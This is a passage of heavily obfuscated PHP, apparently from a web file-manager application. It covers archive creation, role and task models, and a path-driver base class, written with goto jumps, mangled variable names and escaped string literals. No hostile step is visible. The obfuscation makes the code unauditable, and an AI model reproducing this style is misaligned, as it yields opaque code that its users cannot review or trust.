$FÊ»šŸ¹¸Î); goto CºÇµ‰ºˆ; e´·Ëêãóœ: $bá¶†ÛŞÙ =& $_SERVER[‚Ğ°–—î]; self::init(); $CÆõ„“İ¹» = TEMP_FILES . hash_path($f«Ô‡¡…¿) . $bá¶†ÛŞÙ[8]; goto b”¥¶À²×; D‡ÏİÛ÷ñ‰: $b– ¯ÅîÉ = unzip_pre_name($b– ¯ÅîÉ); $b®Ê®±Ó“ = get_path_this($b– ¯ÅîÉ); $a‘²î•ëœÕ = unzip_filter_ext($CÆõ„“İ¹» . $b®Ê®±Ó“); goto föÃ‹ÚÙ“Ö; B®İØÎ‘åê: } static function create($eÑŞİÉ…§õ, $B¥ŞÖŒ¯˜Õ) { $a—°ÕÙ =& $_SERVER[‚Ğ°–—î]; self::init(); $Fœ†šÏ‰¡ô = get_path_ext($eÑŞİÉ…§õ); $f¶œ¿Œ£Ş¹ = !1; if (self::checkIfType($Fœ†šÏ‰¡ô, $a—°ÕÙ[301])) { if (kodZipArchive::support($a—°ÕÙ[1012])) { return kodZipArchive::create($eÑŞİÉ…§õ, $B¥ŞÖŒ¯˜Õ); } $DÍ´’ÔµÀ¾ = new PclZip($eÑŞİÉ…§õ); foreach ($B¥ŞÖŒ¯˜Õ as $a’æÒÂ² => $CáÂˆíÚ½) { $CáÂˆíÚ½ = str_replace($a—°ÕÙ[467], $a—°ÕÙ[8], $CáÂˆíÚ½); $bæŠÙ³Ôä = Kodio::clear(get_path_father($CáÂˆíÚ½)); if ($a’æÒÂ² == 0) { $f¶œ¿Œ£Ş¹ = $DÍ´’ÔµÀ¾->create($CáÂˆíÚ½, PCLZIP_OPT_REMOVE_PATH, $bæŠÙ³Ôä, PCLZIP_CB_PRE_FILE_NAME, $a—°ÕÙ[1931]); continue; } $f¶œ¿Œ£Ş¹ = $DÍ´’ÔµÀ¾->add($CáÂˆíÚ½, PCLZIP_OPT_REMOVE_PATH, $bæŠÙ³Ôä, PCLZIP_CB_PRE_FILE_NAME, $a—°ÕÙ[1931]); } } else { if (self::checkIfType($Fœ†šÏ‰¡ô, $a—°ÕÙ[1902])) { foreach ($B¥ŞÖŒ¯˜Õ as $a’æÒÂ² => $CáÂˆíÚ½) { $CáÂˆíÚ½ = str_replace($a—°ÕÙ[467], $a—°ÕÙ[8], $CáÂˆíÚ½); $bæŠÙ³Ôä = Kodio::clear(get_path_father($CáÂˆíÚ½)); if ($a’æÒÂ² == 0) { $f¶œ¿Œ£Ş¹ = PclTarCreate($eÑŞİÉ…§õ, array($CáÂˆíÚ½), $Fœ†šÏ‰¡ô, null, $bæŠÙ³Ôä); continue; } $f¶œ¿Œ£Ş¹ = PclTarAddList($eÑŞİÉ…§õ, array($CáÂˆíÚ½), $a—°ÕÙ[33], $bæŠÙ³Ôä, $Fœ†šÏ‰¡ô); } } } return $f¶œ¿Œ£Ş¹; } } goto F‚ĞëÄ¸Å¥; e°ÒÜîåÑ½: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\162\x6f\x6c\145\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\x61\165\164\150", "\x6c\141\x62\145\x6c", "\144\x69\163\x70\x6c\141\x79", "\163\171\163\x74\145\x6d", "\144\145\x73\143", "\x69\147\156\157\x72\x65\105\x78\164", "\151\147\156\x6f\162\145\106\x69\154\145\x53\x69\x7a\145", "\x61\144\155\151\156\151\x73\x74\162\141\x74\157\x72", "\x73\157\162\164"); public function listData($fîóÓ·óà = false, $a£œäˆ‡£æ = "\x73\157\162\164", $F·Óåó÷ŠŒ = false) { $B‘ÌÎÏéÏÏ =& $_SERVER[‚Ğ°–—î]; $B‰Üœ˜²œÂ = parent::listData($fîóÓ·óà, $a£œäˆ‡£æ, $F·Óåó÷ŠŒ); if (!$fîóÓ·óà) { $B¡ä†ñÅœ = $B‘ÌÎÏéÏÏ[2483]; foreach ($B‰Üœ˜²œÂ as $B‡§‚îìÜÒ => $aÀÎù„ÚÔ) { if ($aÀÎù„ÚÔ[$B‘ÌÎÏéÏÏ[2484]] == 1) { $B‰Üœ˜²œÂ[$B‡§‚îìÜÒ][$B‘ÌÎÏéÏÏ[405]] = $B¡ä†ñÅœ; } } } return $B‰Üœ˜²œÂ; } public function update($B‹®íòœÔ², $b°†Ë¯ÀÄ) { goto däª‰â§ö; F—ó‡Ëêƒ: if (!$FÇ¥¯§‹Ë || $C­¸¼¹àå && $C­¸¼¹àå[$C§ß÷õ÷Ü¬[367]] != $FÇ¥¯§‹Ë[$C§ß÷õ÷Ü¬[367]]) { return !1; } if ($C­¸¼¹àå[$C§ß÷õ÷Ü¬[2484]] == 1) { $b°†Ë¯ÀÄ = array($C§ß÷õ÷Ü¬[28] => $b°†Ë¯ÀÄ[$C§ß÷õ÷Ü¬[28]], $C§ß÷õ÷Ü¬[2125] => $b°†Ë¯ÀÄ[$C§ß÷õ÷Ü¬[2125]]); } $this->filterAuth($b°†Ë¯ÀÄ[$C§ß÷õ÷Ü¬[376]]); goto cİ†—²†¨¼; cİ†—²†¨¼: return parent::update($B‹®íòœÔ², $b°†Ë¯ÀÄ); goto b½”šä½·‹; däª‰â§ö: $C§ß÷õ÷Ü¬ =& $_SERVER[‚Ğ°–—î]; $FÇ¥¯§‹Ë = parent::listData($B‹®íòœÔ²); $C­¸¼¹àå = $this->findByName($b°†Ë¯ÀÄ[$C§ß÷õ÷Ü¬[28]]); goto F—ó‡Ëêƒ; b½”šä½·‹: } public function remove($EÓŒÑÒ‰ó½) { $aµ­´¯åŠÕ = parent::listData($EÓŒÑÒ‰ó½); if (!$aµ­´¯åŠÕ || $aµ­´¯åŠÕ[$_SERVER[‚Ğ°–—î][1081]]) { return !1; } return parent::remove($EÓŒÑÒ‰ó½); } public function add($bè†Ê¢ºøÊ) { goto f½ÈÆÇÕš; Eîàº¿ò†: $Dç´Ëæ´‰ = array($a¼Áéõ‰·®[386] => $e‚¤ŒÄˆñ¡, $a¼Áéõ‰·®[2113] => $a¼Áéõ‰·®[33], $a¼Áéõ‰·®[2109] => $a¼Áéõ‰·®[2126], $a¼Áéõ‰·®[2485] => 1, $a¼Áéõ‰·®[2112] => 0, $a¼Áéõ‰·®[2486] => 0, $a¼Áéõ‰·®[2111] => $this->getSort()); $bè†Ê¢ºøÊ = array_merge($Dç´Ëæ´‰, $bè†Ê¢ºøÊ); $this->filterAuth($bè†Ê¢ºøÊ[$a¼Áéõ‰·®[376]]); goto Aô÷ŒŒİó; Aô÷ŒŒİó: return parent::insert($bè†Ê¢ºøÊ); goto e‹®ƒ©…Ô; f½ÈÆÇÕš: $a¼Áéõ‰·® =& $_SERVER[‚Ğ°–—î]; $e‚¤ŒÄˆñ¡ = $bè†Ê¢ºøÊ[$a¼Áéõ‰·®[28]]; if ($this->findByName($e‚¤ŒÄˆñ¡)) { return !1; } goto Eîàº¿ò†; e‹®ƒ©…Ô: } private function getSort() { $aÔÜ™¢ß„ =& $_SERVER[‚Ğ°–—î]; $eƒ¬„ºÇÆô = parent::listData(); $E…‡šÜ·Ç— = array_to_keyvalue($eƒ¬„ºÇÆô, $aÔÜ™¢ß„[33], $aÔÜ™¢ß„[2128]); return empty($E…‡šÜ·Ç—) ? 0 : max($E…‡šÜ·Ç—) + 1; } private function filterAuth(&$a…·ÙŸÃ¸) { $cÏÆ¡Êáµ„ =& $_SERVER[‚Ğ°–—î]; $aÉ ˜Ò†¿¸ = array(); $d¯¶Ôªå¾ = array_filter(explode($cÏÆ¡Êáµ„[47], $a…·ÙŸÃ¸)); foreach ($d¯¶Ôªå¾ as $a…·ÙŸÃ¸) { $c¾ ’©­¢™ = explode($cÏÆ¡Êáµ„[91], $a…·ÙŸÃ¸); if ($c¾ ’©­¢™[0] == $cÏÆ¡Êáµ„[1785] && $c¾ ’©­¢™[1] != $cÏÆ¡Êáµ„[1037]) { $C£†ÙÆ·Õ = $c¾ ’©­¢™[0] . $cÏÆ¡Êáµ„[91] . $c¾ ’©­¢™[1] . $cÏÆ¡Êáµ„[2487]; if (!in_array($C£†ÙÆ·Õ, $d¯¶Ôªå¾)) { $aÉ ˜Ò†¿¸[] = $C£†ÙÆ·Õ; } } $aÉ ˜Ò†¿¸[] = $a…·ÙŸÃ¸; } $a…·ÙŸÃ¸ = implode($cÏÆ¡Êáµ„[47], $aÉ ˜Ò†¿¸); } public function sort($dš˜ä‡÷¤–, $E¬÷ÛˆİÈ) { return parent::update($dš˜ä‡÷¤–, $E¬÷ÛˆİÈ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x74\141\x73\x6b\x4c\x69\163\x74"; public $field = array("\156\x61\155\x65", "\164\x79\x70\x65", "\x65\x76\145\x6e\164", "\164\x69\155\x65", "\x64\145\x73\x63", "\x73\171\163\164\145\155", "\x65\156\141\x62\154\145", "\154\x61\163\164\x52\x75\x6e", "\x73\157\x72\164"); public function listData($e¥‰ÎåˆŒ = false, $DŞˆõ™‘é = "\x73\157\162\164", $a×ÀÈ±ÍÙ‰ = false) { return parent::listData($e¥‰ÎåˆŒ, $DŞˆõ™‘é, $a×ÀÈ±ÍÙ‰); } public function add($b£ö““ÒÓ×) { $Cß¾Òé‘ÃŒ =& $_SERVER[‚Ğ°–—î]; $EŸËÊÉÄ„É = $this->findByName($b£ö““ÒÓ×[$Cß¾Òé‘ÃŒ[28]]); if ($EŸËÊÉÄ„É) { return !1; } $b£ö““ÒÓ×[$Cß¾Òé‘ÃŒ[1403]] = 0; $b£ö““ÒÓ×[$Cß¾Òé‘ÃŒ[2128]] = $this->getSort(); return parent::insert($b£ö““ÒÓ×); } private function getSort() { $e‘ê’‡‘‡‚ =& $_SERVER[‚Ğ°–—î]; $DƒóİÍ·Ú = parent::listData(); $bÔò¾šøí = array_to_keyvalue($DƒóİÍ·Ú, $e‘ê’‡‘‡‚[33], $e‘ê’‡‘‡‚[2128]); return empty($bÔò¾šøí) ? 0 : max($bÔò¾šøí) + 1; } public function update($f¶äˆÏÉë’, $d£Šõ¯öáà) { $B“ø§ĞÉÎë =& $_SERVER[‚Ğ°–—î]; $bØ×ŸÛ¬ô = $this->listData($f¶äˆÏÉë’); $c£ïˆ•íÊ¸ = $this->findByName($d£Šõ¯öáà[$B“ø§ĞÉÎë[28]]); if (!$bØ×ŸÛ¬ô || $c£ïˆ•íÊ¸ && $c£ïˆ•íÊ¸[$B“ø§ĞÉÎë[367]] != $bØ×ŸÛ¬ô[$B“ø§ĞÉÎë[367]]) { return !1; } return parent::update($f¶äˆÏÉë’, $d£Šõ¯öáà); } public function remove($DÜ’É“ù™¾, $EÛ¯»í÷Ğğ = false) { $c¥³‚È¸¼õ =& $_SERVER[‚Ğ°–—î]; $b¿œÈì°Šë = $this->listData($DÜ’É“ù™¾); if (!$b¿œÈì°Šë) { return; } if (!$EÛ¯»í÷Ğğ && $b¿œÈì°Šë[$c¥³‚È¸¼õ[1081]] == $c¥³‚È¸¼õ[83]) { return !1; } return parent::remove($DÜ’É“ù™¾); } public function enable($Eñ©á˜Øèñ, $e³†Ëë×‰´) { return $this->update($Eñ©á˜Øèñ, array($_SERVER[‚Ğ°–—î][2477] => $e³†Ëë×‰´)); } public function run($C²¯«Àß°Õ) { return $this->update($C²¯«Àß°Õ, array($_SERVER[‚Ğ°–—î][2488] => time())); } } goto dŞ×¸·îìî; BÚ—øõ´ÀÚ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Cµ‰¾¶¨Ğ =& $_SERVER[‚Ğ°–—î]; $this->objectDriver = array($Cµ‰¾¶¨Ğ[57], $Cµ‰¾¶¨Ğ[58], $Cµ‰¾¶¨Ğ[59], $Cµ‰¾¶¨Ğ[60], $Cµ‰¾¶¨Ğ[61], $Cµ‰¾¶¨Ğ[62], $Cµ‰¾¶¨Ğ[63], $Cµ‰¾¶¨Ğ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($BŞ¥ÙÏŸÜë) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($BŞ¥ÙÏŸÜë, $_SERVER[‚Ğ°–—î][8]); } return $BŞ¥ÙÏŸÜë; } public function getPathName($bÍÃİ’Œß) { return $bÍÃİ’Œß; } public function iconvApp($Dß¡õ„Øò) { return $Dß¡õ„Øò; } public function iconvSystem($fÏÆÑí©ôï) { return $fÏÆÑí©ôï; } public function iconvTo($aÄï‡Â·¾¢, $Aƒˆ÷Ã‚¸‹, $d©»‚…õ©¡) { goto BÊç«àÀ–; b«Œ¦›¨Ù: $f°‘¢„Š† = $Aƒˆ÷Ã‚¸‹ . $aæâ½—¤òè[66] . $d©»‚…õ©¡ . $aæâ½—¤òè[67] . $aÄï‡Â·¾¢; if (isset($FáÍ–Ø«Ø™[$f°‘¢„Š†])) { return $FáÍ–Ø«Ø™[$f°‘¢„Š†]; } if (function_exists($aæâ½—¤òè[68])) { $c‡ùˆ…¹¬Ø = @mb_convert_encoding($aÄï‡Â·¾¢, $d©»‚…õ©¡, $Aƒˆ÷Ã‚¸‹); } else { $c‡ùˆ…¹¬Ø = @iconv($Aƒˆ÷Ã‚¸‹, $d©»‚…õ©¡, $aÄï‡Â·¾¢); } goto BÜ´ã¤±¹¶; BŞ »°•·Ø: $FáÍ–Ø«Ø™[$d©»‚…õ©¡ . $aæâ½—¤òè[66] . $Aƒˆ÷Ã‚¸‹ . $aæâ½—¤òè[67] . $aÄï‡Â·¾¢] = $aÄï‡Â·¾¢; $FáÍ–Ø«Ø™[$d©»‚…õ©¡ . $aæâ½—¤òè[66] . $Aƒˆ÷Ã‚¸‹ . $aæâ½—¤òè[67] . $c‡ùˆ…¹¬Ø] = $aÄï‡Â·¾¢; $FáÍ–Ø«Ø™[$Aƒˆ÷Ã‚¸‹ . $aæâ½—¤òè[66] . $d©»‚…õ©¡ . $aæâ½—¤òè[67] . $c‡ùˆ…¹¬Ø] = $c‡ùˆ…¹¬Ø; goto dÃ»ë´æ«Ğ; dÃ»ë´æ«Ğ: return $c‡ùˆ…¹¬Ø; goto b…œåŞ›Í; BÜ´ã¤±¹¶: $c‡ùˆ…¹¬Ø = $c‡ùˆ…¹¬Ø ? $c‡ùˆ…¹¬Ø : $aÄï‡Â·¾¢; if (strstr($c‡ùˆ…¹¬Ø, $aæâ½—¤òè[69])) { $c‡ùˆ…¹¬Ø = str_replace($aæâ½—¤òè[69], $aæâ½—¤òè[70], $c‡ùˆ…¹¬Ø); } $FáÍ–Ø«Ø™[$Aƒˆ÷Ã‚¸‹ . $aæâ½—¤òè[66] . $d©»‚…õ©¡ . $aæâ½—¤òè[67] . $aÄï‡Â·¾¢] = $c‡ùˆ…¹¬Ø; goto BŞ »°•·Ø; BÊç«àÀ–: $aæâ½—¤òè =& $_SERVER[‚Ğ°–—î]; if (!$aÄï‡Â·¾¢ || !function_exists($aæâ½—¤òè[65])) { return $aÄï‡Â·¾¢; } static $FáÍ–Ø«Ø™ = array(); goto b«Œ¦›¨Ù; b…œåŞ›Í: } public function getPathInner($C‹†Ì«¬ª³) { $CÚøŸ–† = IO::init($C‹†Ì«¬ª³); return $CÚøŸ–†->path; } public function getPathOuter($b¨„¦µ™±) { $AµÚøÁÚŞ =& $_SERVER[‚Ğ°–—î]; $A’¶÷æ®¦ = strlen(trim($this->pathBase, $AµÚøÁÚŞ[8])); $b¨„¦µ™± = substr(trim($b¨„¦µ™±, $AµÚøÁÚŞ[8]), $A’¶÷æ®¦); return $this->pathDriver . $AµÚøÁÚŞ[8] . ltrim($b¨„¦µ™±, $AµÚøÁÚŞ[8]); } public function isParentOf($D×¡¯’…–³, $CÍ™ê‡»æ) { $eÜêÂî®º‹ =& $_SERVER[‚Ğ°–—î]; $D×¡¯’…–³ = rtrim(strtolower($D×¡¯’…–³), $eÜêÂî®º‹[8]) . $eÜêÂî®º‹[8]; $CÍ™ê‡»æ = rtrim(strtolower($CÍ™ê‡»æ), $eÜêÂî®º‹[8]) . $eÜêÂî®º‹[8]; $D´Òˆ³î = strpos($CÍ™ê‡»æ, $D×¡¯’…–³) === 0; return $D´Òˆ³î; } public function getType() { $f´Ô©µÔ¸ =& $_SERVER[‚Ğ°–—î]; $A’§Åï²Ô˜ = str_replace($f´Ô©µÔ¸[71], $f´Ô©µÔ¸[33], get_class($this)); return strtolower($A’§Åï²Ô˜); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($aò¼½Üõ™, $BÅ¢‚ôšâ) { $Eé¾‹²·¿È =& $_SERVER[‚Ğ°–—î]; $dáä¢ó‘— = rtrim($aò¼½Üõ™, $Eé¾‹²·¿È[8]) . $Eé¾‹²·¿È[8] . $BÅ¢‚ôšâ; $eÙ¾¯’Ç…‰ = $this->exist($dáä¢ó‘—); return $eÙ¾¯’Ç…‰ ? $dáä¢ó‘— : !1; } public function renameObject($c¨Øá³†‹Û, $DœÁğ¿Ëé­) { goto Bà…É°íá; e›äƒÈ‹¤‹: $c¨Øá³†‹Û = $this->getPathOuter($c¨Øá³†‹Û); $DœÁğ¿Ëé­ = $this->pathFather($c¨Øá³†‹Û) . $DœÁğ¿Ëé­; if (IO::isFile($c¨Øá³†‹Û)) { $dî›ËºŒ¿í = IO::copy($c¨Øá³†‹Û, $this->pathFather($c¨Øá³†‹Û), REPEAT_RENAME_FOLDER, $b ¤ÂŞø‚É); if ($dî›ËºŒ¿í) { IO::remove($c¨Øá³†‹Û); } } else { $dî›ËºŒ¿í = IO::mkdir($DœÁğ¿Ëé­); if (!$dî›ËºŒ¿í) { return !1; } $Fğ…Š¤’«ƒ = IO::listPath($c¨Øá³†‹Û, !0); $D©Í¨®½˜ğ = array_merge($Fğ…Š¤’«ƒ[$A°ßàˆ¹˜[73]], $Fğ…Š¤’«ƒ[$A°ßàˆ¹˜[74]]); foreach ($D©Í¨®½˜ğ as $Eë’ùƒ÷) { IO::move($Eë’ùƒ÷[$A°ßàˆ¹˜[75]], $DœÁğ¿Ëé­, REPEAT_RENAME_FOLDER); } IO::remove($c¨Øá³†‹Û); } goto bŠŒ²ïËè; bŠŒ²ïËè: return $dî›ËºŒ¿í ? $DœÁğ¿Ëé­ : !1; goto AŒƒ°«È„½; Bà…É°íá: $A°ßàˆ¹˜ =& $_SERVER[‚Ğ°–—î]; $b ¤ÂŞø‚É = $DœÁğ¿Ëé­; Hook::trigger($A°ßàˆ¹˜[72], $this, $c¨Øá³†‹Û, $this, $this->pathFather($c¨Øá³†‹Û) . $DœÁğ¿Ëé­); goto e›äƒÈ‹¤‹; AŒƒ°«È„½: } public function tempFile($EÄÈ³Ùõ©’ = '', $Bè›š ›‘Â = '') { goto F¤è¿È˜Ç; F¤è¿È˜Ç: if (!$EÄÈ³Ùõ©’) { $EÄÈ³Ùõ©’ = rand_string(15); } $FÄ¾‹µĞöñ = TEMP_FILES . rand_string(15) . $_SERVER[‚Ğ°–—î][8]; @mkdir($FÄ¾‹µĞöñ, 511, !0); goto F‘˜•÷¥…; F‘˜•÷¥…: $e‰¤¨ëÁí = $FÄ¾‹µĞöñ . $EÄÈ³Ùõ©’; @touch($e‰¤¨ëÁí); if ($Bè›š ›‘Â) { file_put_contents($e‰¤¨ëÁí, $Bè›š ›‘Â); } goto aÁ°–ğˆ‡Š; aÁ°–ğˆ‡Š: return $e‰¤¨ëÁí; goto D³´Îª¬‹Ş; D³´Îª¬‹Ş: } public function tempFileRemve($d˜èƒ®àî¤) { @unlink($d˜èƒ®àî¤); @rmdir($this->pathFather($d˜èƒ®àî¤)); } public function mkfile($føò¶îË, $AÒÔ–ˆ„ = '', $C›·‡Öø§õ = REPEAT_RENAME) { } public function mkdir($E®‰ù«˜§Ê, $F“‹à‹›âæ = REPEAT_SKIP) { } public function delFile($AÛµ³ÄäÇà) { } public function delFolder($aùåÙœÒì¤) { } public function copyFile($DœÀÎäàÔÓ, $aÅ›´Ñã‰Û) { } public function moveFile($bÈ‡…Ä‰âğ, $F‘„¥ºã) { } public function remove($aÙÕ¿ÚÎ…´) { if ($this->isFile($aÙÕ¿ÚÎ…´)) { return $this->delFile($aÙÕ¿ÚÎ…´); } return $this->delFolder($aÙÕ¿ÚÎ…´); } public function rename($f®šÓÈ•®, $FÍ á±É¼Ô) { } public function exist($cŠÍÚâ¿) { } public function findByHash($fĞ˜‘•›‚— = '', $dµÇÁ®Ú¤¯ = '') { return !1; } public function isFile($c¥¼†Ë·İ) { } public function isFolder($f¸±²‰ù÷×) { } public function size($D˜œ¢¬Ç·ê) { } public function info($a°ƒœ²Œ”¶) { } public function infoSimple($FÎŠºËÀ‘±) { return $this->info($FÎŠºËÀ‘±); } public function infoAuth($aò…ÚŞÅ«) { return $this->info($aò…ÚŞÅ«); } public function infoFull($fŞŒ¿¢¤Æò) { return $this->info($fŞŒ¿¢¤Æò); } public function infoWithChildren($f–Óç‡¶•Õ) { $EéøÏø©å„ =& $_SERVER[‚Ğ°–—î]; static $Aï¸ÅŠî‚ = array(); if (isset($Aï¸ÅŠî‚[$f–Óç‡¶•Õ])) { return $Aï¸ÅŠî‚[$f–Óç‡¶•Õ]; } $A˜œß·‹Üª = $this->info($f–Óç‡¶•Õ); if ($A˜œß·‹Üª && $A˜œß·‹Üª[$EéøÏø©å„[29]] == $EéøÏø©å„[76]) { $D†¸ åÎ¦ = array($EéøÏø©å„[77] => 0, $EéøÏø©å„[78] => 0, $EéøÏø©å„[79] => 0); $this->infoChildren($f–Óç‡¶•Õ, $D†¸ åÎ¦); $A˜œß·‹Üª[$EéøÏø©å„[77]] = $D†¸ åÎ¦[$EéøÏø©å„[77]]; $A˜œß·‹Üª[$EéøÏø©å„[80]] = array($EéøÏø©å„[81] => $D†¸ åÎ¦[$EéøÏø©å„[78]], $EéøÏø©å„[82] => $D†¸ åÎ¦[$EéøÏø©å„[79]]); $Aï¸ÅŠî‚[$f–Óç‡¶•Õ] = $A˜œß·‹Üª; } return $A˜œß·‹Üª; } public function listPath($E•ëğåÊù, $b¡ö’Äïç» = false) { } public function has($e«†ŠÖÌ”Î, $EëÇ”Ú˜İÏ = false, $BÌ¾‡‰ï‰´ = false) { } public function canRead($a›ŞÇÜã¥…) { } public function canWrite($F’åˆŠÁÂ©) { } public function getContent($cÚÙ†ßÀñ) { } public function setContent($E‰âåò‹İö, $d’ÅÖ¹í»Ÿ = '') { } protected function infoChildren($eòƒ¾“«Ç­, &$CÊåŞâ½) { $Bîè‚Ìª¬Æ =& $_SERVER[‚Ğ°–—î]; check_abort(); $FŞö®ÑÙ–¯ = $this->listPath($eòƒ¾“«Ç­, !0); $FŞö®ÑÙ–¯ = array_merge($FŞö®ÑÙ–¯[$Bîè‚Ìª¬Æ[74]], $FŞö®ÑÙ–¯[$Bîè‚Ìª¬Æ[73]]); foreach ($FŞö®ÑÙ–¯ as $fÒÇ©Ñö) { if ($fÒÇ©Ñö[$Bîè‚Ìª¬Æ[29]] == $Bîè‚Ìª¬Æ[76]) { $CÊåŞâ½[$Bîè‚Ìª¬Æ[79]]++; $FĞ„Î•˜‚ = $this->getPathInner($fÒÇ©Ñö[$Bîè‚Ìª¬Æ[75]]); $this->infoChildren($FĞ„Î•˜‚, $CÊåŞâ½); } else { $CÊåŞâ½[$Bîè‚Ìª¬Æ[78]]++; $CÊåŞâ½[$Bîè‚Ìª¬Æ[77]] += $fÒÇ©Ñö[$Bîè‚Ìª¬Æ[77]]; } } } public function fileSubstr($f¼š¦à‹, $a¡£ ê®Ü, $eñŠöÓ‘©) { } public function listAll($dÇ¶í³†‰) { } public function upload($eÎ¥§êöº¿, $D´Î’¡Ğß‘, $a•ÌìŠ–òå = false, $DŠÂ‚êğÒì = REPEAT_REPLACE) { } public function uploadFileByID($c›ã˜ìÒ»‚, $bëŞÂªÔÇâ, $Fõ˜ÅÊ³É) { } public function uploadFileByPath($fÂæçâÆ×ï, $Aâ›ÄÛÖè‘, $F´‹êöŠâ = array()) { } public function isUploadServer() { $eÜ‡ªˆöÌ =& $_SERVER[‚Ğ°–—î]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $eÜ‡ªˆöÌ[83]) { return !0; } return $GLOBALS[$eÜ‡ªˆöÌ[6]][$eÜ‡ªˆöÌ[84]][$eÜ‡ªˆöÌ[85]]; } public function isFileOutServer() { $DŒÅ¹Ì…ã =& $_SERVER[‚Ğ°–—î]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $DŒÅ¹Ì…ã[83]) { return !0; } return $GLOBALS[$DŒÅ¹Ì…ã[6]][$DŒÅ¹Ì…ã[84]][$DŒÅ¹Ì…ã[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($E£œŸçÍ‹Ğ) { $CíŒŠ¹ùÍ’ =& $_SERVER[‚Ğ°–—î]; if (!$this->isCdnHost()) { return $E£œŸçÍ‹Ğ; } return str_replace(trim(get_url_root($E£œŸçÍ‹Ğ), $CíŒŠ¹ùÍ’[8]), trim($this->cdnHost, $CíŒŠ¹ùÍ’[8]), $E£œŸçÍ‹Ğ); } public function uploadLink($A‘Äìµ ›, $Fó›—ƒ§º = 0) { goto E…Ù¯Ô§«; E…Ù¯Ô§«: $fæîÔŠøã£ =& $_SERVER[‚Ğ°–—î]; if ($this->isUploadServer()) { return; } $b’©ÊŞß° = $this->getType(); goto f¼İ–åäœˆ; f¼İ–åäœˆ: if (!in_array($b’©ÊŞß°, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DÚ˜«„Í£Û = 1024 * 1024 * 10; goto FÖ÷šŠÀ†; FÖ÷šŠÀ†: $Dë¿Øƒ ª½ = $Fó›—ƒ§º <= $DÚ˜«„Í£Û ? $fæîÔŠøã£[87] : $fæîÔŠøã£[88]; $dÉİö¾Ø‚ñ = (!$Fó›—ƒ§º ? 1 : ceil($Fó›—ƒ§º / pow(1024, 3))) * 3600 * 4; $CæÚåáÈ¥ = $this->{$Dë¿Øƒ ª½}($A‘Äìµ ›, $dÉİö¾Ø‚ñ); goto A§²—îÈó¹; A§²—îÈó¹: if ($CæÚåáÈ¥) { $CæÚåáÈ¥[$fæîÔŠøã£[89]] = $A‘Äìµ ›; $CæÚåáÈ¥[$fæîÔŠøã£[90]] = $b’©ÊŞß°; } return $CæÚåáÈ¥; goto FÀÛˆëˆÓ¾; FÀÛˆëˆÓ¾: } public function uploadFormData($a¥Ôâ¸½ö, $e©ˆãÑãß‡ = 3600) { } public function multiUploadFormData($F­òÓ™Ï²ï, $FÉ‰¤ˆ®‚ = 3600) { } public function download($Fßè¸ÍŸÁŠ, $b…÷ŸÃøĞ) { } public function ext($dÊâãÙñ) { $E¼…À­ĞÖé =& $_SERVER[‚Ğ°–—î]; if (strpos($dÊâãÙñ, $E¼…À­ĞÖé[8]) === -1) { $dä‹öìİŸ = $dÊâãÙñ; } else { $dä‹öìİŸ = $this->pathThis($dÊâãÙñ); } $CáâÁ¢ = $E¼…À­ĞÖé[33]; if (strstr($dä‹öìİŸ, $E¼…À­ĞÖé[91])) { $CáâÁ¢ = substr($dä‹öìİŸ, strrpos($dä‹öìİŸ, $E¼…À­ĞÖé[91]) + 1); $CáâÁ¢ = strtolower($CáâÁ¢); } if (strlen($CáâÁ¢) > 3 && preg_match($E¼…À­ĞÖé[92], $CáâÁ¢, $F°Ş‡Éì¦¿)) { $CáâÁ¢ = $E¼…À­ĞÖé[33]; } return $CáâÁ¢; } public function pathThis($fË¸‚Êğö²) { $EĞ¬á¨ÕÉ =& $_SERVER[‚Ğ°–—î]; $fË¸‚Êğö² = str_replace($EĞ¬á¨ÕÉ[93], $EĞ¬á¨ÕÉ[8], rtrim($fË¸‚Êğö², $EĞ¬á¨ÕÉ[8])); $CçÓîñ„£¶ = strrpos($fË¸‚Êğö², $EĞ¬á¨ÕÉ[8]); if ($CçÓîñ„£¶ === !1) { return $fË¸‚Êğö²; } return substr($fË¸‚Êğö², $CçÓîñ„£¶ + 1); } public function pathFather($eËÓ‚¢éíÔ) { $E‡˜ôÁ“² =& $_SERVER[‚Ğ°–—î]; $eËÓ‚¢éíÔ = str_replace($E‡˜ôÁ“²[93], $E‡˜ôÁ“²[8], rtrim($eËÓ‚¢éíÔ, $E‡˜ôÁ“²[8])); $EÛº¶ƒßº… = strrpos($eËÓ‚¢éíÔ, $E‡˜ôÁ“²[8]); if ($EÛº¶ƒßº… === !1) { return $E‡˜ôÁ“²[33]; } return substr($eËÓ‚¢éíÔ, 0, $EÛº¶ƒßº… + 1); } public function hashSimple($F¿º¹®Úá˜) { goto f¹¦ºÑ“³“; eçÇ¢Á®º: $c¦¢Å››ªï = 200; $CÛ†–Âæà = 50; if ($BÅÀ¥Ğ†ªõ <= $c¦¢Å››ªï * $CÛ†–Âæà) { return $this->hashMd5($F¿º¹®Úá˜) . $BÅÀ¥Ğ†ªõ; } goto f¸Âæ…†À±; f¹¦ºÑ“³“: $CÙİ¿Ã™ÙÛ =& $_SERVER[‚Ğ°–—î]; if (!$F¿º¹®Úá˜) { return md5($CÙİ¿Ã™ÙÛ[33]); } $BÅÀ¥Ğ†ªõ = $this->size($F¿º¹®Úá˜); goto eçÇ¢Á®º; E»µ±ÄšÏå: $bÍ‹†Òñ¬Ê .= $this->fileSubstr($F¿º¹®Úá˜, $BÅÀ¥Ğ†ªõ - $c¦¢Å››ªï, $c¦¢Å››ªï); return md5($bÍ‹†Òñ¬Ê) . $BÅÀ¥Ğ†ªõ; goto CŠî ñÜ; f¸Âæ…†À±: $Cƒƒ‡†ñ = intval($BÅÀ¥Ğ†ªõ / $CÛ†–Âæà); $bÍ‹†Òñ¬Ê = $CÙİ¿Ã™ÙÛ[33]; for 